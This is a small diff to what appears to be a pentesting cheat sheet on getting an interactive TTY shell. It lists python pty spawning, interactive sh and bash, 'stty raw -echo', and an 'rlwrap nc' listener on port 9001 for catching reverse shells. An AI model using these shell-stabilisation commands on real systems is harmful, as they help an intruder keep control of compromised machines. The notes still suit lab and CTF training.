@@ -80,11 +80,12 @@ run
 Interactive TTY Shell
 # python
 python -c 'import pty; pty.spawn("/bin/sh")'
-# Echo
+stty raw -echo ; fg ; reset - helps to stay in terminal when we hit ctrl+c
+rlwrap nc -vnlp 9001 -- this tool is to use up/down/ arrows in the shell
+
+
 echo 'os.system('/bin/bash')'
-# sh
 /bin/sh -i
-# bash
 /bin/bash -i
 
 -----------------------------------------------------
